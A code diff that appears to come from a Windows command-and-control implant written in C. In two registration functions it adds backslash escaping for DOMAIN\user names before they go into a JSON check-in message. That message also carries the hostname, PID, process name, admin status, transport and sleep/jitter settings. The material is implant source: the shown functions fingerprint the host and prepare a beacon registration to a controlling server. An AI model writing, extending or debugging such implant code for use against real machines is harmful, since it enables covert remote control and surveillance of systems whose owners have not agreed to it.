@@ -336,13 +336,19 @@ int agent_register(void) {
     ULONG u_sz = sizeof(username);
     if (!GetUserNameExA(2 /*NameSamCompatible*/, username, &u_sz))
         GetUserNameA(username, (DWORD*)&u_sz);
+    /* Escape backslashes (DOMAIN\user) for JSON */
+    char username_j[512] = {0};
+    for (int _i = 0, _j = 0; username[_i] && _j < (int)sizeof(username_j) - 2; _i++) {
+        if (username[_i] == '\\') username_j[_j++] = '\\';
+        username_j[_j++] = username[_i];
+    }
 
     char body[1024];
     snprintf(body, sizeof(body),
         "{\"hostname\":\"%s\",\"username\":\"%s\",\"os\":\"windows/amd64\","
         "\"pid\":%lu,\"transport\":\"%s\","
         "\"sleep_sec\":%d,\"jitter_pct\":%d,\"process_name\":\"%s\",\"is_admin\":%s,\"language\":\"c\"}",
-        hostname, username, (unsigned long)GetCurrentProcessId(),
+        hostname, username_j, (unsigned long)GetCurrentProcessId(),
         AGENT_TRANSPORT, AGENT_SLEEP_SEC, AGENT_JITTER_PCT, exe_name,
         is_elevated() ? "true" : "false");
 
@@ -638,12 +644,17 @@ int agent_http_register(void) {
     ULONG u_sz2 = sizeof(username);
     if (!GetUserNameExA(2 /*NameSamCompatible*/, username, &u_sz2))
         GetUserNameA(username, (DWORD*)&u_sz2);
+    char username_j2[512] = {0};
+    for (int _i = 0, _j = 0; username[_i] && _j < (int)sizeof(username_j2) - 2; _i++) {
+        if (username[_i] == '\\') username_j2[_j++] = '\\';
+        username_j2[_j++] = username[_i];
+    }
     char body[1024];
     snprintf(body, sizeof(body),
         "{\"hostname\":\"%s\",\"username\":\"%s\",\"os\":\"windows/amd64\","
         "\"pid\":%lu,\"transport\":\"%s\","
         "\"sleep_sec\":%d,\"jitter_pct\":%d,\"process_name\":\"%s\",\"is_admin\":%s,\"language\":\"c\"}",
-        hostname, username, (unsigned long)GetCurrentProcessId(),
+        hostname, username_j2, (unsigned long)GetCurrentProcessId(),
         AGENT_TRANSPORT, AGENT_SLEEP_SEC, AGENT_JITTER_PCT, exe_name,
         is_elevated() ? "true" : "false");
     uint8_t *resp = NULL; size_t resp_len = 0; int status = 0;
